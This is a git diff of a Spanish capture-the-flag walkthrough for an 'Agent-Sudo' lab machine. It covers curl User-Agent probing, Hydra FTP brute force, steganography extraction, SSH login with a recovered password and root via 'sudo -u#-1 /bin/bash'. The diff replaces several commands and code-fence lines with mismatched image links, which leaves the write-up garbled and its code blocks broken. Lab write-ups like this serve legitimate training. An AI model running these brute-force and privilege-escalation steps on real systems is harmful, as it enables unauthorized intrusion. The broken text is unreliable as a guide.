@@ -66,7 +66,7 @@ Pruebo con curl:
 curl -A "R" http://10.128.181.63
 ```
 ![curl](imagenes/curl.png)
-
+![Nmap](Maquina_de_Linux/Agent-Sudo/imagenes/nmap.png)
 El mensaje cambia y sugiere que hay 25 empleados (A-Z). Pruebo con otros User-Agent:
 
 ```bash
@@ -75,27 +75,27 @@ curl  http://10.128.181.63 -H "User-Agent: C" -L
 ![curl](imagenes/curl2.png)
 
 Con el User-Agent "C" se obtiene un nombre de usuario y la pista de que la contraseña es débil.
-
+![Nmap](Maquina_de_Linux/Agent-Sudo/imagenes/nmap2.png)
 ## 4. Fuerza Bruta de Credenciales FTP
 
 Como el puerto 21 (FTP) está abierto, prueba fuerza bruta con Hydra usando el usuario encontrado:
 ```bash
 hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.128.181.63
-```
+![url](Maquina_de_Linux/Agent-Sudo/imagenes/url.png)
 ![hydra](imagenes/hydra.png)
 
 Cuando consigas la contraseña, conéctate por FTP:
 ```bash
 ftp 10.128.181.63
 ```
-![ftp](imagenes/ftp.png)
+![curl](Maquina_de_Linux/Agent-Sudo/imagenes/curl.png)
 
 Descargo todos los archivos disponibles (texto e imágenes).
 
 ## 5. Análisis de Archivos Descargados
 
 Leo el archivo de texto: suele indicar que las imágenes son falsas y que la contraseña del agente R está oculta en una de ellas.
-
+![curl](Maquina_de_Linux/Agent-Sudo/imagenes/curl2.png)
 ## 6. Esteganografía en Imágenes
 
 Cuando estemos dentro de ftp miramos lo que hay
@@ -105,13 +105,13 @@ ls
 ```
 Vemos varias imagenes, nos descargamos las imagenes 
 
-Ejemplo, así con todas.
+![hydra](Maquina_de_Linux/Agent-Sudo/imagenes/hydra.png)
 ```bash
 get cutie.png
 ```
 Analizo las imágenes con binwalk para buscar archivos ocultos:
 
-```bash
+![ftp](Maquina_de_Linux/Agent-Sudo/imagenes/ftp.png)
 binwalk -e cutie.png
 ```
 ![binwalk](imagenes/binwalk.png)
@@ -133,7 +133,7 @@ Descomprimo el zip con la contraseña  que seria alien obtenida y revisa el cont
 
 ```bash
 7z x 8702.zip
-```
+![binwalk](Maquina_de_Linux/Agent-Sudo/imagenes/binwalk.png)
 ![zip](imagenes/zip2.png)
 
 Miramos el texto escondido en la imagen
@@ -146,41 +146,41 @@ cat To_agentR.txt
 Vamos a usar base64 para desencriptar lo que encontramos en el archivo
 
 ```bash
-echo 'QXJlYTUx' | base64 -d
+![zip](Maquina_de_Linux/Agent-Sudo/imagenes/zip.png)
 ```
 ![cat](imagenes/base.png)
 
 
 Uso la contraseña encontrada para extraer información oculta de la otra imagen (por ejemplo, con steghide):
 
-```bash
+![zip](Maquina_de_Linux/Agent-Sudo/imagenes/zip2.png)
 steghide extract -sf cute-alien.jpg -p Area51
 ```
 ![steghide](imagenes/steghide.png)
 
 Miramos dentro del archivo de message.txt para ver que hay.
 
-cat message.txt
+![cat](Maquina_de_Linux/Agent-Sudo/imagenes/cat.png)
 
 ![cat2](imagenes/cat2.png)
 
 ## 7. Acceso SSH
 
 Con las credenciales obtenidas, accedo por SSH:
-```bash
+![cat](Maquina_de_Linux/Agent-Sudo/imagenes/base.png)
 ssh james@10.129.186.113
 ```
 ![ssh](imagenes/ssh.png)
 
 La contraseña que usaremos es esta:
 
-```bash
+![steghide](Maquina_de_Linux/Agent-Sudo/imagenes/steghide.png)
 hackerrules!
 ```
 
 ## 8. Escalada de Privilegios
 
-Enumera los permisos sudo:
+![cat2](Maquina_de_Linux/Agent-Sudo/imagenes/cat2.png)
 ```bash
 sudo -l
 ```
@@ -188,7 +188,7 @@ Si nos sale  ‘(ALL, !root) /bin/bash’ o algo parecido, haremos este comando.
 
 ```bash
 sudo -u#-1 /bin/bash
-```
+![whoami](Maquina_de_Linux/Agent-Sudo/imagenes/whoami.png)
 Nos dará root directamente. Comprobamos si somos root
 
 ```bash
